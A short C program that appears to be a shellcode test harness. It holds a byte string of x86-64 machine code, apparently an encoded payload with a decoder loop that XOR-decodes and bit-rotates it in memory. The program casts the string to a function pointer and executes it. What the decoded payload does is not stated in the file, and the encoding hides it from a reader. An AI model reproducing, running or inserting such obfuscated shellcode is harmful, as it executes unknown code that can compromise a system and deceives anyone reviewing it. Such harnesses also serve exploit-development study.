#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x42\x49\xff\x18\x02\x07\xff\x8a\xff\x94\xff\xd5\x02\xb8\x02\xb1\xff\x68\x02\xde\xff\x8b\x02\xc5\x02\x27\x02\x2d\xff\x49\x02\xa4\xff\x88\x02\x73\x02\x45\xff\x4a\xff\x88\x02\x7c\xff\x59\x02\xa4\xff\x88\x02\xcf\xff\x25\xff\x50\x02\x1c\xff\xd1\x02\x38\x02\x08\x02\xa0\xa0\x48\x8d\x35\xb7\xff\xff\xff\x48\x8d\x7e\x01\x48\x31\xc0\x48\xf7\xe0\xb0\x01\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x9d\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x48\xff\xc7\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd0\x48\x31\xc9\xeb\xcb";


main() {

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}

